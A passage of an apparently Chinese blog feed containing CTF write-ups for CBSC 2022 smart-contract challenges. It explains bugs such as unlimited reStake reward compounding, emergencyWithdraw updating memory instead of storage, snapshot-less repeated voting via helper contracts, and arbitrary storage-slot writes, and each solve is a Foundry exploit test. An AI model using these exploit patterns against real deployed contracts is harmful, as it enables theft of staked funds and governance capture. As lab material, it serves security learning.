&#125;</span><br></pre></td></tr></table></figure><p>顾名思义，就是质押过后，你还可以再次质押。但是阅读完方法之后，这个再次质押居然不需要扣除我们的金额，任何金额都不需要扣我们的，因为他是获取我们质押金额所获得的利润，然后将利润再次质押，同时token合约也会将自己的代币存入进去。</p><p>这种利滚利的质押逻辑不对，我们啥都不会扣除，用利润来滚利润，然后token合约也不断的存钱，直到token合约不够钱存。应该加一些限制，再次质押不应该是用利润来质押，而应该也要用自己新的钱来质押才对。</p><blockquote><p>还有一种方法可以找到这个地方：<code>ctrl+f</code>寻找distributor变量余额减少的地方（其实也没几处），因为题目就算要求我们让distributor余额减少。</p></blockquote><p>解题思路：我们通过空投可以获得一笔token和LP，无论是使用<code>_index=0</code>来质押代币还是<code>_index=1</code>都是可以的，因为<code>reStake()</code>可以无限次调用。虽然<code>reStake()</code>可以不停的调用，但也要注意<code>calculateTokenReward()</code>计算利润的方式，选择在一个合适的时间，否则利润非常小不停<code>reStake()</code>会有gas问题，程序跑到死机：）</p><p>做法：获取空投=&gt;质押LP=&gt;等4小时=&gt;不停的restake</p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;./interface.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract attackTest is Test &#123;</span><br><span class="line">    string constant MdexFactory_Artifact = &#x27;out/factory.sol/MdexFactory.json&#x27;;</span><br><span class="line">    string constant WHT_Artifact = &#x27;out/WHT.sol/WHT.json&#x27;;</span><br><span class="line">    string constant MdexRouter_Artifact = &#x27;out/router.sol/MdexRouter.json&#x27;;</span><br><span class="line">    string constant deploy_Artifact = &#x27;out/deploy.sol/deploy.json&#x27;;</span><br><span class="line"></span><br><span class="line">    IMdexFactory public mdexFactory;</span><br><span class="line">    IWHT public wht;</span><br><span class="line">    IMdexRouter public router;</span><br><span class="line">    IDeploy public deploy;</span><br><span class="line">    IMdexPair public pair; </span><br><span class="line">    IQuintConventionalPool public pool;</span><br><span class="line"></span><br><span class="line">    address public attacker = 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4;</span><br><span class="line"></span><br><span class="line">    event flag(string result,address challenger);</span><br><span class="line">    </span><br><span class="line">    function setUp() public&#123;</span><br><span class="line">        // 1.部署factory合约，调用getInitCodeHash函数获取hash在setInitCodeHash中进行初始化</span><br><span class="line">        mdexFactory = IMdexFactory(deployHelper_mdexFactory(MdexFactory_Artifact));</span><br><span class="line">        mdexFactory.setInitCodeHash(mdexFactory.getInitCodeHash());</span><br><span class="line">        console.log(&quot;1.factory contract initializes successfully!&quot;);</span><br><span class="line">        // 2.部署router合约，填入factory地址和WHT地址（WHT地址可以为任意不产生影响）</span><br><span class="line">        wht = IWHT(deployHelper_wht(WHT_Artifact));</span><br><span class="line">        router = IMdexRouter(deployHelper_mdexRouter(MdexRouter_Artifact,address(mdexFactory),address(wht)));</span><br><span class="line">        console.log(&quot;2.router contract:&quot;, address(router));</span><br><span class="line">        // 3.部署deploy合约，填入factory和router合约地址，之后调用step1和step2函数进行初始化</span><br><span class="line">        deploy = IDeploy(deployHelper_deploy(deploy_Artifact,address(mdexFactory),address(router)));</span><br><span class="line">        console.log(&quot;3.deploy contract:&quot;, address(deploy));</span><br><span class="line">        deploy.Step1();</span><br><span class="line">        deploy.step2();</span><br><span class="line">        // 4.调用airdrop函数领取初始代币</span><br><span class="line">        vm.startPrank(attacker);</span><br><span class="line">        deploy.airdrop();</span><br><span class="line">        vm.stopPrank();</span><br><span class="line">        console.log(&quot;4.attacker gets airdrop:&quot;, deploy.balanceOf(attacker));</span><br><span class="line">        console.log(&quot;complete initialization, please start your attack.&quot;);</span><br><span class="line">        console.log();</span><br><span class="line"></span><br><span class="line">        // 其他初始化工作</span><br><span class="line">        pair = IMdexPair(deploy.pair());</span><br><span class="line">        pool = IQuintConventionalPool(deploy.quintADDRESS());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function test_isComplete() public&#123;</span><br><span class="line">        vm.startPrank(attacker);</span><br><span class="line">       </span><br><span class="line">        console.log(&quot;prepare for attack&quot;);</span><br><span class="line">        console.log();</span><br><span class="line">        pair.approve(address(pool), type(uint256).max);</span><br><span class="line">        deploy.approve(address(pool), type(uint256).max);</span><br><span class="line">        // stake增加质押LP的数量</span><br><span class="line">        pool.stake(99999999999999999999000, 1);</span><br><span class="line">        // 等一段时间，这样我们可以得到一些利润, 因为5小时之内的利率比较高，领取到的利润也就高，</span><br><span class="line">        // 因此选择在4小时，累计一段时间，然后利率又高，因此可以得到的钱也更多</span><br><span class="line">        uint256 newtime = block.timestamp + 3600 * 4;</span><br><span class="line">        vm.warp(newtime);</span><br><span class="line">        console.log(&quot;4 hours later&quot;);</span><br><span class="line">        console.log();</span><br><span class="line"></span><br><span class="line">        // 利用restake的漏洞</span><br><span class="line">        for (uint256 i = 0;; i++) &#123;</span><br><span class="line">            // 直到 distributor 不够钱了，就无法转出去，然后报错，我们捕获然后停止</span><br><span class="line">            console.log(&quot;[for loop] deploy&#x27;s balance:&quot;,deploy.balanceOf(address(deploy)));</span><br><span class="line">            try pool.reStake(1) &#123;</span><br><span class="line">            &#125; catch (bytes memory err) &#123;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        console.log();</span><br><span class="line"></span><br><span class="line">        vm.expectEmit(true, true, true, true);</span><br><span class="line">        emit flag(&quot;succese&quot;, attacker);</span><br><span class="line">        pool.captureFlag();</span><br><span class="line">        </span><br><span class="line">        console.log(&quot;deploy&#x27;s balance:&quot;,deploy.balanceOf(address(deploy)));</span><br><span class="line">        console.log(&quot;captureFlag!&quot;);</span><br><span class="line"></span><br><span class="line">        vm.stopPrank();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 因为foundry在一个测试文件中存在编译器版本问题，所以采取这种方式进行部署合约</span><br><span class="line">    function deployHelper_mdexFactory(string memory what) public returns (address addr) &#123;</span><br><span class="line">        bytes memory bytecode = vm.getCode(what);</span><br><span class="line">        // 构造器有参数</span><br><span class="line">        bytes memory bytecode_withConstructor = abi.encodePacked(bytecode,abi.encode(address(this)));</span><br><span class="line">        assembly &#123;</span><br><span class="line">            addr := create(0, add(bytecode_withConstructor, 0x20), mload(bytecode_withConstructor))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function deployHelper_wht(string memory what) public returns (address addr) &#123;</span><br><span class="line">        bytes memory bytecode = vm.getCode(what);</span><br><span class="line">        assembly &#123;</span><br><span class="line">            addr := create(0, add(bytecode, 0x20), mload(bytecode))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function deployHelper_mdexRouter(string memory what,address _addr1, address _addr2) public returns (address addr) &#123;</span><br><span class="line">        bytes memory bytecode = vm.getCode(what);</span><br><span class="line">        // 构造器有参数</span><br><span class="line">        bytes memory bytecode_withConstructor = abi.encodePacked(bytecode,abi.encode(_addr1,_addr2));</span><br><span class="line">        assembly &#123;</span><br><span class="line">            addr := create(0, add(bytecode_withConstructor, 0x20), mload(bytecode_withConstructor))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function deployHelper_deploy(string memory what,address _addr1, address _addr2) public returns (address addr) &#123;</span><br><span class="line">        bytes memory bytecode = vm.getCode(what);</span><br><span class="line">        // 构造器有参数</span><br><span class="line">        bytes memory bytecode_withConstructor = abi.encodePacked(bytecode,abi.encode(_addr1,_addr2));</span><br><span class="line">        assembly &#123;</span><br><span class="line">            addr := create(0, add(bytecode_withConstructor, 0x20), mload(bytecode_withConstructor))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 16.CBSC 2022 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>09.challenge</title>
      <link href="/2023/07/28/16.CBSC%20CTF%202022/09.challenge/"/>
      <url>/2023/07/28/16.CBSC%20CTF%202022/09.challenge/</url>
      
        <content type="html"><![CDATA[<h1 id="09-challenge"><a href="#09-challenge" class="headerlink" title="09.challenge"></a>09.challenge</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="1-全局观"><a href="#1-全局观" class="headerlink" title="1.全局观"></a>1.全局观</h3><p>四个合约</p><ul><li>deploy<ul><li>部署attack2合约</li></ul></li><li>attack2<ul><li>实现了IERC721Receiver，说明可以接收ERC721代币</li><li>有选择性的调用EverytingIsArt合约的<code>hopeIsInSight()</code></li></ul></li><li>attack<ul><li>实现了IERC721Receiver，说明可以接收ERC721代币</li><li>有选择性的调用EverytingIsArt合约的<code>hopeIsInSight()</code>和<code>theHope()</code></li></ul></li><li>EverytingIsArt<ul><li>是一个ERC721代币</li><li>三个方法可以铸币</li><li>初始化题目</li></ul></li></ul><h3 id="2-任务"><a href="#2-任务" class="headerlink" title="2.任务"></a>2.任务</h3><p>刚好获得288个NFT</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function isCompleted() public view returns (bool) &#123;</span><br><span class="line">    require(balanceOf(msg.sender) == 288,&quot;You are not yet a good artist, you should keep trying.&quot;);</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-分析"><a href="#3-分析" class="headerlink" title="3.分析"></a>3.分析</h3><p>有三个方法都可以获得代币，先来看<code>becomeAnArtist()</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function becomeAnArtist(uint256 _count) public returns (bool) &#123;</span><br><span class="line">    require(_count &gt;= 288, &quot;Why don&#x27;t you want to be an artist?&quot;);</span><br><span class="line"></span><br><span class="line">    for (uint256 i = 0; i &lt; _count; i++) &#123;</span><br><span class="line">        uint256 tokenId = totalMinted.add(1);</span><br><span class="line">        _safeMint(msg.sender, tokenId);</span><br><span class="line">        totalMinted = totalMinted.add(1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>额这个直接调用就完成题目了，因为题目是<code>_safeMint()</code>因此需要实现<code>onERC721Received()</code>，这个随便骗骗它就好</p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;../../src/09.challenge/EverytingIsArt.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract attackTest is Test &#123;</span><br><span class="line">    EverytingIsArt everytingIsArt;</span><br><span class="line"></span><br><span class="line">    function setUp() public&#123;</span><br><span class="line">        everytingIsArt = new EverytingIsArt();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function test_isComplete() public&#123;</span><br><span class="line">        everytingIsArt.becomeAnArtist(288);</span><br><span class="line">        assertEq(everytingIsArt.isCompleted(),true);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)public returns (bytes4)&#123;</span><br><span class="line">        return this.onERC721Received.selector;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 16.CBSC 2022 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>08.challenge</title>
      <link href="/2023/07/28/16.CBSC%20CTF%202022/08.challenge/"/>
      <url>/2023/07/28/16.CBSC%20CTF%202022/08.challenge/</url>
      
        <content type="html"><![CDATA[<h1 id="06-challenge"><a href="#06-challenge" class="headerlink" title="06.challenge"></a>06.challenge</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="1-全局观"><a href="#1-全局观" class="headerlink" title="1.全局观"></a>1.全局观</h3><p>三部分：</p><ul><li>interface.sol：接口</li><li>Masterchef.sol：<ul><li>虽然代码很多，其实就只有MasterChef合约需要关注，因为像Ownable, ERC20这种东西一般是不会出考点出问题的</li><li>MasterChef本身便是一个ERC20代币</li><li>有空投机制</li><li>有owner转让机制</li><li>质押代币到池子中，可以有很多个池子。计算利润，计算比较复杂，不懂没问题。池子中质押的金额有好几个方法都是与计算有关，更新池子数据的</li><li>一个质押存款函数，两个取款函数</li></ul></li><li>Governance.sol<ul><li>治理合约，在Masterchef合约中拥有的代币数目可以进行投票</li><li>身份权限机制</li><li>题目初始化</li></ul></li></ul><p>总的来说，就是质押有关的题目，质押生息，获得代币，足量的代币可以成为owner和进行投票，投票数额到达一定量才可以通过</p><h3 id="2-任务"><a href="#2-任务" class="headerlink" title="2.任务"></a>2.任务</h3><p>我们需要拥有超过代币总发行量2/3的投票数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// 成为Validator：至少需要代币总发行量的2/3</span><br><span class="line">function setValidator() public &#123;</span><br><span class="line">    uint256 votingSupply = masterChef.totalSupply() * 2 / 3;</span><br><span class="line">    require(validatorVotes[msg.sender] &gt;= votingSupply);</span><br><span class="line">    ValidatorOwner = msg.sender;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 任务：成为Validator</span><br><span class="line">function setflag() public onlyValidatorOwner &#123;</span><br><span class="line">    Flag = true;</span><br><span class="line">    emit Sendflag(Flag);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-分析"><a href="#3-分析" class="headerlink" title="3.分析"></a>3.分析</h3><p>首先有空投，那么我们可以领取完所有的代币1000：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function airdorp() public &#123;</span><br><span class="line">    require(aridorplimit &lt; 1000,&quot;&quot;);</span><br><span class="line">    _mint(msg.sender,1);</span><br><span class="line">    aridorplimit = aridorplimit + 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这么少代币显然不够，我们必须得想法法搞多点：</p><ul><li>质押生息？要等区块，并且一个区块生息的数目不好算，我也看的不是很懂，并且无法控制区块的进度，这条路走不通</li><li>存取款是否有毛病？质押看起来没啥毛病，取款呢？普通取款没啥问题，但是看一下紧急取款<code>emergencyWithdraw()</code>（没利息）：我们的质押数额扣除是在memory，但是增加是在storage，那么这样我们就可以无限的取款了，知道掏空合约中的所有钱</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function emergencyWithdraw(uint256 _pid) public &#123;</span><br><span class="line">    // memory意味着不会修改任何storage数据</span><br><span class="line">    PoolInfo memory pool = poolInfo[_pid];</span><br><span class="line">    UserInfo memory user = userInfo[_pid][msg.sender];</span><br><span class="line">    // 用户拿到了取款</span><br><span class="line">    this.transfer(address(msg.sender), user.amount);</span><br><span class="line">    emit EmergencyWithdraw(msg.sender, _pid, user.amount);</span><br><span class="line">    // 更新用户个人资产信息</span><br><span class="line">    pool.totalstake -= user.amount; </span><br><span class="line">    user.amount = 0;</span><br><span class="line">    user.rewardDebt = 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们掏空合约的所有钱 10_000_000，就算投票也是不够总数额100_000_000+10_000_000的三分之二的。因此，还要想办法再搞多点钱。但是剩下的钱都在合约部署者身上，我们无法拿走，因此转向能不能拿多点投票数？</p><p>一般的项目都是使用snapshot来进行拍照记录投票数，但是本题没使用，似乎可以无限投票？那么我投完票之后，可以把钱给别人，然后别人也可以投票呀！因此，我们创建几个傀儡账户，轮番使用我们10_000_000金额进行投票给我，想要多少票都可以哈哈</p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity 0.6.12;</span><br><span class="line">pragma experimental ABIEncoderV2; // 不加这个会报错，原因如下：https://github.com/foundry-rs/foundry/issues/4376</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;../../src/08.challenge/Governance.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract attackTest is Test &#123;</span><br><span class="line">    Governance public governance;</span><br><span class="line">    MasterChef public masterChef;</span><br><span class="line">    Helper[10] public helpers;</span><br><span class="line">    uint256 constant ALLMONEY = 10000000;</span><br><span class="line"></span><br><span class="line">    function setUp() public&#123;</span><br><span class="line">        governance = new Governance(&quot;level&quot;);</span><br><span class="line">        masterChef = governance.masterChef();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function test_isComplete() public&#123;</span><br><span class="line">        // 拿走全部空投</span><br><span class="line">        for(uint i = 0; i &lt; 1000; i++)&#123;</span><br><span class="line">            masterChef.airdorp();</span><br><span class="line">        &#125;</span><br><span class="line">        assertEq(masterChef.balanceOf(address(this)),1000);</span><br><span class="line">        // 存款: 存到第一个池子。此时我们token的余额为0，但是质押了1000个代币</span><br><span class="line">        masterChef.approve(address(masterChef), 1000);</span><br><span class="line">        masterChef.deposit(0, 1000);</span><br><span class="line">        // emergencyWithdraw漏洞：拿走合约中所有的钱</span><br><span class="line">        // 10000000 / 1000 = 10000</span><br><span class="line">        for(uint i = 0; i &lt; 10000; i++)&#123;</span><br><span class="line">            masterChef.emergencyWithdraw(0);</span><br><span class="line">        &#125;</span><br><span class="line">        // 检查是否拿完了合约中的所有钱</span><br><span class="line">        assertEq(masterChef.balanceOf(address(this)),ALLMONEY);</span><br><span class="line">        // 我们有了足够的钱，可以成为owner了</span><br><span class="line">        masterChef.transferOwnership(address(this));</span><br><span class="line">        assertEq(masterChef.owner(),address(this));</span><br><span class="line">        // 成为了owner之后就可以投票了，但是只能投票一次</span><br><span class="line">        governance.vote(address(this));</span><br><span class="line">        // 创建10个Helper来帮助我们获得更多的投票</span><br><span class="line">        for(uint i = 0; i &lt; 10; i++)&#123;</span><br><span class="line">            helpers[i] = new Helper(address(masterChef), address(governance));</span><br><span class="line">        &#125;</span><br><span class="line">        // 10个Helper继承我们金钱，然后继续投票给我</span><br><span class="line">        for(uint i = 0; i &lt; 10; i++)&#123;</span><br><span class="line">            // 转钱到Helper</span><br><span class="line">            masterChef.transfer(address(helpers[i]),ALLMONEY);</span><br><span class="line">            // 用Helper帮助我们投票</span><br><span class="line">            helpers[i].help(address(this));</span><br><span class="line">        &#125;</span><br><span class="line">        // 检查是否大于2/3的投票</span><br><span class="line">        assertGt(governance.validatorVotes(address(this)),masterChef.totalSupply() * 2 / 3);</span><br><span class="line">        governance.setValidator();</span><br><span class="line">        governance.setflag();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Helper&#123;</span><br><span class="line">    MasterChef masterChef;</span><br><span class="line">    Governance governance;</span><br><span class="line">    uint256 constant ALLMONEY = 10000000;</span><br><span class="line"></span><br><span class="line">    constructor(address _masterChef,address _governance)public&#123;</span><br><span class="line">        masterChef = MasterChef(_masterChef);</span><br><span class="line">        governance = Governance(_governance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function help(address _addr) public&#123;</span><br><span class="line">        // Helper有钱之后就可以成为Owner</span><br><span class="line">        masterChef.transferOwnership(address(this));</span><br><span class="line">        // 成为owner之后就给本合约投票</span><br><span class="line">        governance.vote(_addr);</span><br><span class="line">        // 投完票之后把钱给回本合约</span><br><span class="line">        masterChef.transfer(_addr, ALLMONEY);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 16.CBSC 2022 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>07.challenge</title>
      <link href="/2023/07/28/16.CBSC%20CTF%202022/07.challenge/"/>
      <url>/2023/07/28/16.CBSC%20CTF%202022/07.challenge/</url>
      
        <content type="html"><![CDATA[<h1 id="06-challenge"><a href="#06-challenge" class="headerlink" title="06.challenge"></a>06.challenge</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p><a href="https://www.levi104.com/2023/06/23/00.security/37.FlashLoanMain/">之前做过一模一样的</a></p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2>]]></content>
      
      
      <categories>
          
          <category> 16.CBSC 2022 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>06.challenge</title>
      <link href="/2023/07/28/16.CBSC%20CTF%202022/06.challenge/"/>
      <url>/2023/07/28/16.CBSC%20CTF%202022/06.challenge/</url>
      
        <content type="html"><![CDATA[<h1 id="06-challenge"><a href="#06-challenge" class="headerlink" title="06.challenge"></a>06.challenge</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p><a href="https://www.levi104.com/2023/06/23/00.security/38.LostAssets/">之前做过一次一模一样的</a></p><p>题目要求成为admin和拥有9999999999999999999999999999999999的余额</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function isComplete() public  &#123;</span><br><span class="line">    require(admin == msg.sender);</span><br><span class="line">    require(gasDeposits[msg.sender] &gt;= 9999999999999999999999999999999999);</span><br><span class="line">    emit SendFlag();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此方法可以修改任意slot的内容，题目的要求都是位于storage的，因此可以通过修改storage数据来完成题目</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function setLogicContract(bytes32 key, address contractAddress) external &#123;</span><br><span class="line">    StorageSlot.AddressSlot storage slot = StorageSlot.getAddressSlot(key);</span><br><span class="line">    emit SetLogicContract(key, slot.value, contractAddress);</span><br><span class="line">    slot.value = contractAddress;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要懂得mapping计算和constant不占用slot</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//mapping的value实际存储位置计算公式：keccak256(bytes32(key)+bytes32(slot))</span><br><span class="line">function getStorageLocationForKey(address _key) public pure returns(bytes32) &#123;</span><br><span class="line">        // _key : mapping 的 key</span><br><span class="line">        // 0 : 我们的balances这个mapping位于slot 0 </span><br><span class="line">        // 如果部署slot 0，那么换成对应的slot 就ok了</span><br><span class="line">        return keccak256(abi.encode(_key, 0));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity 